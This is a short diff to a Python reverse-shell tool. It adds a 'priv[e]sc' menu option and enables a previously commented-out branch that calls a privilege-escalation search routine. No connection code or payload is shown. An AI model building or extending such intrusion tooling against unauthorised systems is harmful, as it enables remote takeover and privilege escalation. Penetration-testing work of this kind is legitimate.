@@ -41,7 +41,7 @@ class ReverseShell:
             self.running = False
             return ''
         elif command.lower() == 'h':
-            print('actions: [r]un, [u]pload, [d]ownload, [h]elp')
+            print('actions: [r]un, [u]pload, [d]ownload, priv[e]sc, [h]elp')
             return ''
         elif command.lower() == 'r':
             arg = input('run file commands: <src> ')
@@ -59,9 +59,9 @@ class ReverseShell:
         #    args = args.split(' ')
         #    self.receive_file(args[0], args[1])
             return ''
-        #elif command.lower() == 'privesc':
-        #    self.search_for_privesc()
-        #    return ''
+        elif command.lower() == 'e':
+            self.search_for_privesc()
+            return ''
         return command + '\n'
 
     def commands_from_local_file(self, local_file):
